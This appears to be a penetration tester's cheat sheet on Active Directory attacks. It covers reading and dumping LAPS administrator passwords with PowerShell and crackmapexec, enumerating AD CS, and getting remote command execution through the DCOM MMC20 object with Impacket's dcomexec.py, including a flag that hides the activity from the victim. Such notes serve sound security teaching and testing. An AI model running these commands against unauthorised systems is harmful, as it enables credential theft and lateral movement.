# LAPS
**LAPS** allows you to manage the local **Administrator** password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       

When using LAPS, 2 new attributes appear in the computer objects of the domain: ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime. These attributes contains the plain-text admin password and the expiration time. Then, in a domain environment, it could be interesting to check which users can read these attributes.

# Commands
```powershell
# Check if LAPS is activated
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"

# Get commands available
Get-Command *AdmPwd*

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

# Dumping Credentials via crackmapexec
```bash
# LDAP
crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps

# SMB
crackmapexec smb <ip> -u <user> -p <password> --laps
```



# Active Directory Certificate Services (ADCS)
Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols.     
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview)

## Enumeration
Here, one should look for services that haven't been discovered before.
```sh
crackmapexec ldap <ip> -u <username> -p <password> -M adcs
```



# Abusing COM & DCOM
## Explanation of the Technologies
### COM
COM is, simply put, a method for sharing binary code across different applications and languages.

COM solves all these problems by defining a binary standard, meaning that COM specifies that the binary modules (the DLLs and EXEs) must be compiled to match a specific structure. The standard also specifies exactly how COM objects must be organized in memory. The binaries must also not depend on any feature of any programming language (such as name decoration in C++).

### DCOM
Specifies the Distributed Component Object Model (DCOM) Remote Protocol, which exposes application objects via remote procedure calls (RPCs) and consists of a set of extensions layered on the Microsoft Remote Procedure Call Extensions.

## Exploitation
A DCOM application **MMC20** allows for snap-in operations. One method withing the application is name `ExecuteShellCommand`. As the name suggests
this allows for command execution over the network.

### POC
One can use Impacket's `dcomexec.py` script to obtain RCE.          
```bash
dcomexec.py <domain>>/<user>:<password>@<ip> <command> -silentcommand -object MMC20
```
*-silentcommand is needed, as otherwise a cmd window will open up on the victim's screen*


## References
- [https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model?redirectedfrom=MSDN)
- [https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN)
- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)